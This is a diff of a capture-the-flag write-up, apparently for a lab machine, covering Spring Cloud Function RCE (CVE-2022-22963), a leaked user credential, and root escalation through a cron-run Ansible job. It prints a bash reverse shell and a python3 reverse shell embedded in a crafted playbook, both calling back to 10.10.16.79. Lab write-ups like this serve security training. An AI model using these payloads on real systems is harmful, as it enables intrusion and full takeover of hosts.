@@ -159,11 +159,9 @@ Now Google is your friend, start searching for known vulnerabilities we can expl
 
 ### Exploiting
 We find [CVE-2022-22963: Remote Code Execution in Spring Cloud Function by malicius Spring Expression](https://spring.io/security/cve-2022-22963).
-
 "In Spring Cloud Function versions 3.1.6, 3.2.2 and older unsupported versions, when using routing functionality it is possible for a user to provide a specially crafted SpEL as a routing-expression that may result in remote code execution and access to local resources".
 
 Let's understand how the vulnerability works ([source](https://sysdig.com/blog/cve-2022-22963-spring-cloud/#:~:text=The%20vulnerability%20CVE%2D2022%2D22963,also%20allows%20remote%20code%20execution.)):
-
 The Spring Cloud Function framework allows developers to write cloud-agnostic functions using Spring features. These functions can be stand-alone classes and one can easily deploy them on any cloud platform yo build a serverless framework.
 The major advantage of Spring Cloud Function is that it provides all the features of Spring Boot-like autoconfiguration and dependency injection.
 The issue is that it permits using HTTP request header `spring.cloud.function.routing-expression` parameter and SpEL expression to be injected and executed through `StandardEvaluationContext`.
@@ -183,7 +181,7 @@ We can test the vulnerability by creating a file `test` in the `/tmp` directory 
 # Reverse Shell
 Now that we discovered an RCE, we can download and execute a reverse shell on the machine.
 We can use a bash reverse shell:
-```bash
+```
 bash -i >& /dev/tcp/10.10.16.79/1234 0>&1
 ```
 
@@ -230,3 +228,30 @@ We notice a credential leak of the user phil: `phil:DocPhillovestoInject123`.
 We can now swith user: `su phil` and get the flag in the `/home/phil/user.txt` file.
 
 # Root
+Getting root is a bit more tricky, we can use [pspy](https://github.com/DominicBreuker/pspy) to scan the server for all the processes that are being executed.
+We can notice a `CRON` process that keeps executing an `Ansible` playbook.
+```
+2023/03/25 16:54:10 CMD: UID=0     PID=54819  | /usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml
+```
+With a bit of research we know that `Ansible` is an automation tool that enables users to automate configuration management, application deployment and task automation using `YAML` files.
+So the `/opt/automation/tasks/playbook_1.yml` is being executed every once in a while.
+If we keep analyzing our `pspy` ouput we can notice another process that is being executed:
+```
+2023/03/25 16:54:10 CMD: UID=0     PID=54813  | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
+```
+We can see that `ansible-parallel` is being executed with elevated privileges on all `YAML` files in the `/opt/automation/tasks` directory.
+We can exploit this process to make it execute a special crafted YAML payload to get a privileged shell.
+So we create a `test.yml` file in the `/opt/automation/tasks` directory with a payload to a python3 reverse `/bin/bash` shell on a different port: 
+```yaml
+---
+    - name: a
+      hosts: localhost
+      tasks:
+            - name: b
+              command: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.79",4999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+Now we can listen on the port `4999` waiting for the file to be executed and enstablish the connection:
+```
+lc -lvnp 4999
+```
+Once we got the `/bin/bash` shell we can `cd /root` and get the flag in the `root.txt` file.
